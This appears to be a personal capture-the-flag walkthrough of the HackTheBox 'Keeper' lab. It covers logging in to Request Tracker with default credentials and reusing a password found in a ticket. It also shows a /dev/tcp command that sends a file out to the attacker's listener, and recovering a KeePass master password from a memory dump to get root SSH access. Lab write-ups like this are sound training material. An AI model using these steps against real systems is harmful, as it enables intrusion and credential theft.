### NMAP

```
sudo nmap -sC -sV -oN keeper-nmap 10.10.11.227
```

![[HackTheBox/Linux/attachments/Pasted image 20250504235335.png]]
- 22, 80

Browse to website 

![[HackTheBox/Linux/attachments/Pasted image 20250504235425.png]]
- add tickets.keeper.htb to /etc/hosts

Navigate to tickets.keeper.htb and we see a login 

![[HackTheBox/Linux/attachments/Pasted image 20250504235549.png]]

Also get some info from the website footer
![[HackTheBox/Linux/attachments/Pasted image 20250504235610.png]]
- version RT 4.4.4

Google "request tracker 4.4.4" to find any public exploits (nope)

Google "request tracker default password"

Default creds - `root:password`

![[HackTheBox/Linux/attachments/Pasted image 20250504235933.png]]

Try these default creds and we login to the web app.

There are some tickets (this is like a helpdesk ticket tracker site)
![[HackTheBox/Linux/attachments/Pasted image 20250505000122.png]]

Looking at the user and we see the initial password is Welcome2023!
![[HackTheBox/Linux/attachments/Pasted image 20250505000348.png]]

### SSH in as User for Initial Access
Try to ssh in as lnorgaard with the Welcome2023! password

```
ssh lnorgaard@10.10.11.227
```

❗initial access❗

![[HackTheBox/Linux/attachments/Pasted image 20250505000552.png]]
- send this RT30000.zip to kali
On Kali
```
nc -lvnp 9001 > RT30000.zip 
```

On shell 
```
cat RT30000.zip > /dev/tcp/10.10.14.8/9001
```

![[HackTheBox/Linux/attachments/Pasted image 20250505000812.png]]

Unzip the file 

![[HackTheBox/Linux/attachments/Pasted image 20250505000937.png]]
- KeePass database 
- KeePass dump file 

KeePass database password is likely within the dump file. 

Google "extract keepass password from dump"

Here's a github tool [Keepass Password Dumper ](https://github.com/vdohney/keepass-password-dumper)

Clone this repo and execute 

```
dotnet run ../KeePassDumpFull.dmp
```

It dumps out the password 
![[HackTheBox/Linux/attachments/Pasted image 20250505001428.png]]

Try to open keepass database using this password, but it doesn't work. 

![[HackTheBox/Linux/attachments/Pasted image 20250505001603.png]]

Google the password string and it autocorrects to this 

![[HackTheBox/Linux/attachments/Pasted image 20250505001739.png]]

Input this string instead and we can open the keepass database

Poking through the KeePass database and discover putty private key 

![[HackTheBox/Linux/attachments/Pasted image 20250505002600.png]]

We also see this root password 
![[HackTheBox/Linux/attachments/Pasted image 20250505002645.png]]

But this doesn't work
![[HackTheBox/Linux/attachments/Pasted image 20250505002710.png]]

Save the putty key as root.ppk 

### Convert Putty Key to OpenSSH

Install putty tools to get putty gen 

```
sudo apt install putty-tools
```

![[HackTheBox/Linux/attachments/Pasted image 20250505003020.png]]

Run the conversion but get an error 

![[HackTheBox/Linux/attachments/Pasted image 20250505003119.png]]

We are ppk version 3. 

We have putty gen 7.4 and we need putty gen 7.5

Go to the putty source code site and download the source archive

![[HackTheBox/Linux/attachments/Pasted image 20250505003251.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250505003319.png]]

Extract the archive  with `tar -zxvf`

![[HackTheBox/Linux/attachments/Pasted image 20250505003420.png]]

Run `cmake .` after cd'ing into the putty directory 

![[HackTheBox/Linux/attachments/Pasted image 20250505003511.png]]

Then run `cmake --build .`

![[HackTheBox/Linux/attachments/Pasted image 20250505003552.png]]

Find the puttygen

```
find . -name puttygen
```

![[HackTheBox/Linux/attachments/Pasted image 20250505003657.png]]

Then rerun the putty command to convert the ppk

![[HackTheBox/Linux/attachments/Pasted image 20250505003745.png]]

Change permissions of the new `id_dsa`

```
chmod 600 id_dsa
```

### SSH in as root 

```
ssh -i id_dsa root@1keeper.htb
```

![[HackTheBox/Linux/attachments/Pasted image 20250505003915.png]]

⭐ got root ⭐




